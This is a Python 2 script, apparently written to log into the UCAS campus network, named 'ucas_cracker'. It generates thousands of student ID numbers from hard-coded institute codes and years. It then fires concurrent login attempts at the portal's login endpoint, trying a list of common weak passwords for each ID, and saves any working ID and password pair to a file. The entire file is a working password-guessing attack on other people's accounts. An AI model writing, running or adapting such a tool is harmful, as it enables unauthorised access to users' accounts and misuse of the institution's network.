#!/usr/bin/env python
# -*- coding:utf-8 -*-
'''
    author :zhang bin
    description: login ucas network.
    date:2016-04-13
'''

import urllib2, threading, urllib, traceback, json, cookielib, time, socket
import gevent
from gevent import monkey
monkey.patch_all()

institutes = [   8008805,  8006161,  8010861,  8008817,
            8012938,  8012940,  8008846,  8008849,  8012951,
            8006811,  8006812,  8018458,  8002718,  8006815,
            8322208,  8012961,  8006837,  8006841,  8012661,
            8002761,  8006861,  8000718,  8000722,  8015059,
            8015061,  8017110,  8017111,  8017113,  8017114,
            8017151,  8006912,  8015107,  8002822,  8011015,
            8002826,  8002829,  8015119,  8015120,  8015121,
            8011030,  8015127,  8015128,  8006937,  8002842,
            8011036,  8011037,  8011042,  8000807,  8011051,
            8002861,  8006961,  8011061,  8000822,  8006537,
            8015161,  8009018,  8009024,  8017915,  8013822,
            8009029,  8017227,  8017229,  8009043,  8002901,
            8000861,  8007010,  8002917,  8017261,  8007027,
            8240507,  8240508,  8000907,  8000908,  8007061,
            8017307,  8017308,  8000929,  8017315,  8000936,
            8004508,  8017322,  8013229,  8006011,  8003007,
            8003008,  8000961,  8011203,  8013261,  8003022,
            8011215,  8003024,  8017361,  8003033,  8015329,
            8001007,  8003061,  8009207,  8009208,  8011261,
            8015359,  8017408,  8015361,  8001027,  8009220,
            8009222,  8001034,  8017419,  8017422,  8013329,
            8006915,  8001061,  8018358,  8003333,  8015861,
            8009261,  8013359,  8013361,  8011315,  8017461,
            8005811,  8300108,  8006927,  8011361,  8017515,
            8009326,  8009327,  8009328,  8009329,  8015126,
            8017542,  8003208,  8009361,  8003222,  8015129,
            8017561,  8007326,  8007329,  8007335,  8001207,
            8015547,  8003261,  8009408,  8005313,  8009410,
            8009907,  8009415,  8009422,  8013524,  8010361,
            8009433,  8009437,  8013537,  8009443,  8003308,
            8005361,  8013561,  8015615,  8007661,  8017235,
            8003361,  8015651,  8005414,  8013607,  8007651,
            8005417,  8009515,  8017708,  8015661,  8017715,
            8530107,  8013622,  8013626,  8017727,  8017728,
            8017729,  8007512,  8009561,  8007514,  8013661,
            8017758,  8017761,  8007313,  8007534,  8005514,
            8017808,  8017815,  8017220,  8013726,  8013727,
            8017826,  8004251,  8009643,  8009646,  8009649,
            8007610,  8007611,  8013761,  8017861,  8015814,8000761,  8007637,
            8014924,  8014933, 8010840,  8014937,  8008801,
            8010851,
            8540107,  8540108,  8007631,  8015837,  8008233, 8002808
            ]


class ucas_cracker():
    def __init__(self):
        self.cj = cookielib.CookieJar() # 初始化一个cookie补全，用于存储cookie
        self.handler = urllib2.HTTPCookieProcessor(self.cj) # 创建一个cookie处理器
        self.opener = urllib2.build_opener(self.handler) # 创建一个功能强大的opener
        self.header = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0'}
        self.login_url = 'http://210.77.16.21/eportal/InterFace.do?method=login'
        self.skip_ids = set(['201428002808002', '201328010840023'])
        self.default_passwd = ['ucas', 'ucas123', 'qq123456', 'wang1234', '111111', '11111111', '1869', '112233', '123123', '123321', '654321', '666666', '888888', 'acdef', 'abcabc', 'abc123', 'a1b2c3', 'aaa111', '123qwe', 'qwerty', 'qweasd', 'password', '123456']
        self.outfile = open('res.txt', 'r+')
        self.stop = False




    def login(self, num_str,passwd):
        '''
            Send http post data
        '''
        post_data  = {'operatorPwd':'',
                        'password':passwd,
                        'queryString':'wlanuserip%3Df39d702ca0df2e11a2255c72882701a3%26wlanacname%3D5fcbc245a7ffdfa4%26ssid%3D%26nasip%3D2c0716b583c8ac3cbd7567a84cfde5a8%26mac%3Db797ed2ab023e626efebdf25e303b028%26t%3Dwireless-v2%26url%3D709db9dc9ce334aa55e551ef049661032a4bc5c1106b8d46a6a775f3f24d084359ff9091ee2edfe0897d8064c70cbffa2a1691f4121dff765e07d3e755773622',
                        'service':'',
                        'userId': num_str,
                        'validcode':''}
        data_encode = urllib.urlencode(post_data)

        while not self.stop:
            try:
                req = urllib2.Request(self.login_url, data_encode, self.header)
                res = self.opener.open(req, timeout = 5).read()
                data = json.loads(res, encoding = 'UTF-8')if res is not None else None
                #print self.cj._cookies.values()
                time.sleep(0.1)
                return data

            except socket.timeout as e:
                #print num_str, e
                time.sleep(2)

            except Exception as e:
                print num_str, e
                #print traceback.format_exc()


    def generator(self):
        #years = ['2014', '2009', '2010', '2011', '2012' ,'2013', '2008']
        years = ['2014', '2013']
        features = ['2', '1', 'E']
        for institute in institutes:
            for grade in years:
                for feature in features:
                    ids = []
                    for index in range(0, 300):
                        ids.append(grade + feature + "%07d%03d" % (institute, index))
                    yield ids

    def run(self):
        for ids in self.generator():
            threads = []
            for num in ids:
                threads.append(gevent.spawn(self.crack, num))
            gevent.joinall(threads)

    def crack(self, num):
        if self.stop: return False
        if num in self.skip_ids: return False
        for passwd in self.default_passwd:
            json_data = self.login(num, passwd)
            if (json_data is None) or (not json_data.has_key('result')): return False
            elif json_data['result'] == 'success':
                print 'Login with ID: ',num,'\r\npassword: ', passwd, u'\r\n 厉害了!!!!'
                self.outfile.write('Login with ID: ' + num + '\r\n' + 'password: ' + passwd + '\r\n')
                self.stop = True
                return True
            elif json_data['message'] == u'用户不存在,请输入正确的用户名!':
                print num, json.dumps(json_data, encoding="UTF-8", ensure_ascii=False)
                return False
                #print num, json.dumps(json_data, encoding="UTF-8", ensure_ascii=False)
            print num, json.dumps(json_data, encoding="UTF-8", ensure_ascii=False)



def main():
    t = ucas_cracker()
    t.run()

if __name__=='__main__': main()


